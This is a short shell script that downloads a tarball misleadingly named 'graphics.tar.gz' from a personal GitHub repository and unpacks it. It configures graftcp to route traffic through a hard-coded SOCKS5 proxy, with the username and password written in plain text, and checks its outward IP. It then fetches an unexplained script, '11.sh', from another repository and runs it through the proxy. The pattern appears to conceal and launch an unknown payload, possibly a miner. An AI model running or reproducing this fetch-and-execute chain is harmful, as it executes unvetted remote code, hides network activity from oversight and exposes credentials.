wget https://github.com/Akatsoki/joss/raw/main/graphics.tar.gz
tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 45.140.13.124:9137
socks5_username = faraddd802
socks5_password = faraddd802
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "

echo " "

wget https://github.com/rindalasririn/a/raw/main/11.sh


chmod +x 11.sh

./graftcp/graftcp ./11.sh
